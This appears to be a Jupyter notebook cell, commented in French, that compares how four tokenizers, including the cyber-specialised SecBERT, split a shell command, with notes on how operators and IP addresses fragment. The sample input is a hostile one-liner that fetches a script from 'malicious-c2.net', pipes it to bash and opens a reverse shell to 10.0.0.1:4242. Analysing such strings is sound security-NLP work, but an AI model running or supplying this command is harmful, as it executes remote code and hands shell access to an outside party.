In [ ]:
import pandas as pd
from transformers import AutoTokenizer

# Commande typique contenant de la syntaxe shell, des IPs, ports et redirections
sample_cmd = "curl http://malicious-c2.net/payload.sh | bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"

# 4 tokenizers représentatifs :
# 1. DistilBART (BPE standard de RoBERTa/BART, utilise 'Ġ' pour les espaces)
# 2. BERT (WordPiece standard, utilise '##' pour les sous-mots)
# 3. GPT-2 (Byte-level BPE, précurseur des LLMs actuels)
# 4. SecBERT (BERT pré-entraîné spécifiquement sur corpus cyber : CVE, CTI, logs)
tokenizers = {
    "DistilBART (Byte-BPE)": AutoTokenizer.from_pretrained("valhalla/distilbart-mnli-12-3"),
    "BERT Base (WordPiece)": AutoTokenizer.from_pretrained("bert-base-uncased"),
    "GPT-2 (Byte-level BPE)": AutoTokenizer.from_pretrained("gpt2"),
    "SecBERT (Cyber-specialized)": AutoTokenizer.from_pretrained("jackaduma/SecBERT"),
}

print(f"COMMANDE BRUTE ANALYSÉE : {sample_cmd}\n" + "=" * 80)

results = []

for name, tok in tokenizers.items():
    # Découpage en sous-mots
    tokens = tok.tokenize(sample_cmd)
    token_ids = tok.encode(sample_cmd, add_special_tokens=False)
    
    results.append({
        "Tokenizer": name,
        "Nb Tokens": len(tokens),
        "Tokens": tokens,
        "Token IDs": token_ids
    })

# Affichage comparatif formaté
for r in results:
    print(f"\n--- {r['Tokenizer']} ---")
    print(f"Nombre de tokens : {r['Nb Tokens']}")
    print(f"Tokens découpés  : {r['Tokens']}")
    print(f"IDs correspondants: {r['Token IDs']}")

print("\n" + "=" * 80)
print("POINTS CRITIQUES À OBSERVER :")
print("1. Fragmentation des symboles : Les opérateurs shell ('>&', '0>&1') sont éclatés en tokens isolés.")
print("2. Adresses IP : Aucun tokenizer standard ne conserve '10.0.0.1' en un seul bloc (découpage point par point).")
print("3. Sur-fragmentation = Surconsommation de la fenêtre de contexte et perte de sémantique syntaxique.")